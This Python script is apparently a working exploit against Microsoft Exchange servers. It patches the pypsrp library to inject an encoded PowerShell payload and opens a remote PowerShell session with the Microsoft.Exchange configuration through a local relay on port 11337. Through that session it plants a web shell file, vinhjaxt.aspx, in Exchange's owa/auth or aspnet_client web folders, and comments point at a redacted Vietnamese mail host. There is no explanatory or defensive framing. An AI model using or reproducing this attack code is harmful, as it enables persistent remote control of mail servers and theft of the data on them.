import sys
import base64
import html


def powershell_base64encode(cmd):
    return base64.b64encode(cmd.encode("UTF-16LE")).decode()

def modify_pypsrp(cmd):
    print(cmd)
    msg = ""
    with open("pypsrp/messages-bk.py") as f:
        msg = f.read()
        f.close()

    with open("pypsrp/messages.py", "w") as f:
        msg = msg.replace(
            "$$POWERSHELL_ENCODE_PAYLOAD_HERE$$", powershell_base64encode(cmd)
        )
        msg = msg.replace(
            "$$POWERSHELL_PAYLOAD_HERE$$", html.escape(cmd.replace('\\', '\\\\'))
        )
        f.write(msg)
        f.close()


def exploit():
    # https://mail.xxx.vn/owa/auth/vinhjaxt.aspx
    # https://mail.xxx.vn/aspnet_client/vinhjaxt.aspx
    shell_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\vinhjaxt.aspx"
    shell_absolute_path = "\\\\127.0.0.1\\c$\\%s" % shell_path

    shell_absolute_path = "\\\\127.0.0.1\\c$\\inetpub\\wwwroot\\aspnet_client\\vinhjaxt.aspx"

    modify_pypsrp(""" copy NUL {CMD} """.format(CMD=shell_absolute_path))
    sys.path.append("./")
    from pypsrp.powershell import PowerShell, RunspacePool
    from pypsrp.wsman import WSMan
    wsman = WSMan("127.0.0.1", port=11337, ssl=False, encryption="never", auth="basic", username="user", password="pass")
    with RunspacePool(wsman, configuration_name="Microsoft.Exchange") as pool:
        def run(cmd, args=[]):
            ps = PowerShell(pool)
            c = ps.add_cmdlet(cmd)
            for arg in args:
                c.add_argument(arg)

            output = ps.invoke()

            print("=================================")

            stdout = "\n".join([str(s) for s in output])
            print("Output:\n\n")
            print(stdout)

            errors = "\n".join([str(s) for s in ps.streams.error])
            print("\n\nError:\n")
            print(errors)

            print("\n\nHad Errors:", ps.had_errors)

        run("Get-Mailbox", ["-Anr"])
        run("New-OfflineAddressBook")


def test():
    with open("pypsrp/messages-orig.py") as f:
        msg = f.read()
        f.close()
    with open("pypsrp/messages.py", "w") as f:
        f.write(msg)
        f.close()

    sys.path.append("./")
    from pypsrp.powershell import PowerShell, RunspacePool
    from pypsrp.wsman import WSMan
    wsman = WSMan("127.0.0.1", port=11337, ssl=False, encryption="never", auth="basic", username="user", password="pass")
    with RunspacePool(wsman, configuration_name="Microsoft.Exchange") as pool:
        def run(cmd, args=[]):
            ps = PowerShell(pool)
            c = ps.add_cmdlet(cmd)
            for arg in args:
                c.add_argument(arg)

            output = ps.invoke()

            print("=================================")

            stdout = "\n".join([str(s) for s in output])
            print("Output:\n\n")
            print(stdout)

            errors = "\n".join([str(s) for s in ps.streams.error])
            print("\n\nError:\n")
            print(errors)

            print("\n\nHad Errors:", ps.had_errors)

        run("Get-Command")
        run("Get-Mailbox", ["-Anr"])

# test()
exploit()